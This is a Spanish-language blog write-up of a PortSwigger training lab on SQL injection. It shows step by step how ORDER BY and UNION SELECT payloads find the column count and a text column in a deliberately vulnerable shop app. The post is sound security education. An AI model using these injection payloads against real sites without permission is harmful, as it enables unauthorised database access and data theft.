---
layout: single
title: SQL injection UNION attack, finding a column containing text – PortSwigger Write Up
excerpt: "En este post vamos a estar resolviendo el laboratorio de PortSwigger: “SQL injection UNION attack, finding a column containing text."
date: 2022-10-13
classes: wide
#header:
#  teaser: /assets/images/portswigger/stored_xss_into_html_context_with_nothing_encoded/portada.png
#  teaser_home_page: true
categories:
  - Portswigger
tags:
  - SQL Injection
  - Practitioner
---

En este post vamos a estar resolviendo el laboratorio de PortSwigger: "SQL injection UNION attack, finding a column containing text."

<p align="center">
     <img src="/assets/images/portswigger/sql_injection_union_attack_finding_column_containing_text/1.png" width="1000">
</p><br>

## Explicación 

Habiendo identificado el número requerido de columnas en el blog anterior, su próxima tarea es descubrir una columna que tenga un tipo de datos de 
cadena para que pueda usar esto para extraer datos arbitrarios de la base de datos. Puede hacer esto inyectando una consulta que contenga NULL, como lo hizo 
anteriormente y reemplazando sistemáticamente cada NULL con 'a'. Por ejemplo, si sabe que la consulta debe devolver tres columnas, puede inyectar lo siguiente.


```plaintext
' UNION SELECT 'a', NULL, NULL--
' UNION SELECT NULL, 'a', NULL--
' UNION SELECT NULL, NULL, 'a'--
```

Cuando se ejecuta la consulta, puede ver una fila adicional de datos que contiene el valor 'a'. Luego puede usar esa columna relevante que tiene la cadena de tipo de datos para extraer datos de la base de datos.

Si el tipo de datos de una columna no es compatible con los datos de cadena, la consulta inyectada provocará un error en la base de datos. 
Puede usar los errores de esa base de datos para determinar las columnas que tienen la cadena de tipo de datos.

Resolvamos el ataque UNION de inyección SQL Lab-4 , `encontrando una columna que contenga texto`

Vulnerabilidad SQLi: filtro de categoría de producto.

## PASO 1: Determine el número de columnas devueltas por la consulta original

Como discutimos en la publicación anterior, podemos hacer esto mediante la inyección de una serie de cláusulas ORDER BY o la inyección de una serie de cargas útiles de UNION SELECT.

Para la demostración de este ejercicio de laboratorio, estoy usando la cláusula `ORDER BY`.

Como vemos es una tienda que se divide por productos y secciones entonces vamos a interceptar con el burpsuite las peticiones de ver detalles de uno de los productos y ver como podemos 
inyectar código sql.

<p align="center">
     <img src="/assets/images/portswigger/sql_injection_union_attack_finding_column_containing_text/2.png" width="1000">
</p><br>


```plaintext
' ORDER BY 1 -- 
```

<p align="center">
     <img src="/assets/images/portswigger/sql_injection_union_attack_finding_column_containing_text/4.png" width="1000">
</p><br>

```plaintext
' ORDER BY 2 -- 
```

<p align="center">
     <img src="/assets/images/portswigger/sql_injection_union_attack_finding_column_containing_text/5.png" width="1000">
</p><br>

```plaintext
' ORDER BY 3 -- 
```


<p align="center">
     <img src="/assets/images/portswigger/sql_injection_union_attack_finding_column_containing_text/6.png" width="1000">
</p><br>

```plaintext
' ORDER BY 4 -- 
```


<p align="center">
     <img src="/assets/images/portswigger/sql_injection_union_attack_finding_column_containing_text/7.png" width="1000">
</p><br>

```plaintext
' ORDER BY 4 -- Devuelve un mensaje de error 
```
Por lo tanto, el número de columnas devueltas por la consulta original es 3. 

## PASO 2: Descubra la columna que tiene un tipo de datos de cadena.

```plaintext
' UNION SELECT 'a', NULL, NULL --
```

<p align="center">
     <img src="/assets/images/portswigger/sql_injection_union_attack_finding_column_containing_text/8.png" width="1000">
</p><br>

```plaintext
' UNION SELECT NULL, 'a', NULL --
```


<p align="center">
     <img src="/assets/images/portswigger/sql_injection_union_attack_finding_column_containing_text/9.png" width="1000">
</p><br>

```plaintext
' UNION SELECT 'a', NULL, NULL-- Devuelve un mensaje de error.
' UNION SELECT NULL, 'a', NULL: devuelve el código de respuesta 200.
' UNION SELECT NULL, NULL, 'a'-- Devuelve un mensaje de error.
```

Por lo tanto, la columna 2 tiene el tipo de datos de cadena.

## PASO 3: Devuelve una fila adicional que contiene el valor de cadena proporcionado en el laboratorio

Valor proporcionado por el laboratorio: ' NAv682'

Puede usar el valor de cadena proporcionado en lugar de 'a' para resolver el ejercicio de laboratorio de la siguiente manera:

```plaintext
' UNION SELECT NULL, 'NAv682', NULL --
```

Laboratorio resuelto.

<p align="center">
     <img src="/assets/images/portswigger/sql_injection_union_attack_finding_column_containing_text/10.png" width="1000">
</p><br>

<p align="center">
     <img src="/assets/images/portswigger/sql_injection_union_attack_finding_column_containing_text/11.png" width="1000">
</p><br>


¡Un saludo y espero que os sirva de apoyo!






